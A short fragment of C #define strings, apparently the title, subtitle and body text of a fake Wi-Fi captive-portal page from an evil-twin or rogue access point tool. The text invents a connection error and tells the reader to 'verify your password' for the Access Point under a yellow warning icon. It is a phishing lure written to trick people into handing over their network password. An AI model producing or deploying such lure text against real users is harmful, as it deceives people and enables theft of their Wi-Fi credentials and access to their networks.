...
#define SUBTITLE "VERIFY YOUR IDENTITIY!"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Authetication Prompt"
#define BODY "An error occured while connecting you to the Access Point.<br><br>To connect you successfully to Access Point, please verify your password."
